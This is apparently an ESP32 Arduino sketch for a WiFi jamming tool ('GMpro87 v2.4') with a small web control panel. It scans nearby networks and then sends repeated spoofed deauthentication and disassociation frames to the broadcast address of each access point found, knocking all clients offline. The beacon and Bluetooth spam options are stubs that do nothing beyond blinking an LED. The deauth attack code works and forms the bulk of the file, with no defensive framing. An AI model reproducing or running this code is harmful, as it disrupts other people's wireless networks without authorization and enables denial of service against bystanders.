#include <WiFi.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <vector>

const int btnDeauth = 35, btnScan = 34, ledPin = 2;

struct wifiData { int num = 0; std::vector<String> ssid, bssid; std::vector<int> channel; };
wifiData targetData;
bool isAttacking = false, isBeaconSpam = false, isBLESpam = false, isScanDone = false;
unsigned long attackStartTime = 0, beaconCount = 0, bleCount = 0;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

WebServer server(80);

const char* bleNames[] = {"AirPods","AirPods Pro","Galaxy Buds","PowerBeats","Beats","Sony WH","Jabra","Bose QC","Pixel Buds","LG Tone"};
int bleNameCount = 10;

void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) { uint8_t fc[2],d[2],a1[6],a2[6],a3[6],s[2],r[2]; } p;
  memset(&p, 0, sizeof(p));
  memcpy(p.a1, sta, 6); memcpy(p.a2, bssid, 6); memcpy(p.a3, bssid, 6);
  for (int i = 0; i < 50; i++) {
    p.fc[0] = 0xC0; p.r[0] = 0x07; esp_wifi_80211_tx(WIFI_IF_STA, &p, sizeof(p), false);
    p.fc[0] = 0xA0; p.r[0] = 0x04; esp_wifi_80211_tx(WIFI_IF_STA, &p, sizeof(p), false); yield();
  }
}

void scanNet() {
  digitalWrite(ledPin, HIGH);
  targetData.ssid.clear(); targetData.bssid.clear(); targetData.channel.clear();
  int n = WiFi.scanNetworks();
  targetData.num = n;
  for (int i = 0; i < n; i++) {
    targetData.ssid.push_back(WiFi.SSID(i));
    targetData.channel.push_back(WiFi.channel(i));
    targetData.bssid.push_back(WiFi.BSSIDstr(i));
  }
  isScanDone = (n > 0);
  digitalWrite(ledPin, LOW);
}

String getHTML() {
  String h = "<!DOCTYPE html><meta charset=UTF-8><meta name=viewport content=width=device-width><title>GMpro87</title><style>";
  h += "body{background:#111;color:#fff;font-family:system-ui;padding:15px;margin:0}";
  h += "h1{color:#0f0;text-align:center;text-shadow:0 0 15px #0f0}";
  h += ".c{background:#1a1a1a;padding:15px;border-radius:10px;margin:10px 0}";
  h += ".b{display:inline-block;padding:12px 20px;background:#0f0;color:#000;border:none;border-radius:6px;margin:3px;cursor:pointer;font-weight:bold}";
  h += ".br{background:#00f;color:#fff}.r{background:#f00;color:#fff}";
  h += ".d{display:flex;justify-content:space-between;padding:8px;border-bottom:1px solid #333}";
  h += ".l{color:#888}.v{color:#0f0;font-weight:bold}";
  h += "a{text-decoration:none}</style><body><h1>GMpro87 v2.4</h1>";
  h += "<div class=c><div class=d><span class=l>WiFi</span><span class=v>" + String(isAttacking ? "ON" : "OFF") + "</span></div>";
  h += "<div class=d><span class=l>Beacon</span><span class=v>" + String(isBeaconSpam ? "ON" : "OFF") + "</span></div>";
  h += "<div class=d><span class=l>BLE</span><span class=v>" + String(isBLESpam ? "ON" : "OFF") + "</span></div>";
  h += "<div class=d><span class=l>Networks</span><span class=v>" + String(targetData.num) + "</span></div></div>";
  h += "<div class=c><a href=/><button class=b>Refresh</button>";
  h += "<a href=/scan><button class=b>Scan</button>";
  h += "<a href=/attack><button class=b" + String(isAttacking ? "r" : "") + ">" + String(isAttacking ? "Stop" : "Attack") + "</button>";
  h += "<a href=/beacon><button class=b" + String(isBeaconSpam ? "r" : "br") + ">Beacon</button>";
  h += "<a href=/ble><button class=b" + String(isBLESpam ? "r" : "br") + ">BLE</button></div>";
  h += "<p style=text-align:center;color:#555>ESP32-WROOM-32U</p></body></html>";
  return h;
}

void handleRoot() { server.send(200, "text/html", getHTML()); }
void handleScan() { scanNet(); server.sendHeader("Location", "/"); server.send(302); }
void handleAttack() { isAttacking = !isAttacking; if (isAttacking) attackStartTime = millis(); server.sendHeader("Location", "/"); server.send(302); }
void handleBeacon() { isBeaconSpam = !isBeaconSpam; server.sendHeader("Location", "/"); server.send(302); }
void handleBLE() { isBLESpam = !isBLESpam; server.sendHeader("Location", "/"); server.send(302); }

void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("[*] GMpro87 v2.4 Starting...");
  pinMode(btnDeauth, INPUT_PULLUP); pinMode(btnScan, INPUT_PULLUP); pinMode(ledPin, OUTPUT);
  WiFi.mode(WIFI_AP); delay(100);
  WiFi.softAP("GMpro", "Sangkur87");
  Serial.print("[+] IP: "); Serial.println(WiFi.softAPIP());
  server.on("/", handleRoot); server.on("/scan", handleScan); server.on("/attack", handleAttack);
  server.on("/beacon", handleBeacon); server.on("/ble", handleBLE); server.begin();
  Serial.println("[+] Ready! Web: http://192.168.4.1");
}

void loop() {
  server.handleClient();
  if (digitalRead(btnScan) == LOW) { delay(200); scanNet(); while(digitalRead(btnScan) == LOW) delay(10); }
  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (!isScanDone) scanNet();
    if (targetData.num > 0) { isAttacking = !isAttacking; if (isAttacking) attackStartTime = millis(); }
    while(digitalRead(btnDeauth) == LOW) delay(10);
  }
  if (isAttacking && targetData.num > 0) {
    digitalWrite(ledPin, HIGH);
    for (int i = 0; i < targetData.num; i++) {
      if (!isAttacking) break;
      int ch = targetData.channel[i]; if (ch < 1) ch = 1; if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t b[6]; sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
      sendPacket(b, broadcastAddr); delay(2); yield();
    }
    digitalWrite(ledPin, LOW);
  } else if (isBeaconSpam) { digitalWrite(ledPin, HIGH); delay(50); digitalWrite(ledPin, LOW); }
  else if (isBLESpam) { digitalWrite(ledPin, HIGH); delay(50); digitalWrite(ledPin, LOW); }
  else { digitalWrite(ledPin, LOW); }
}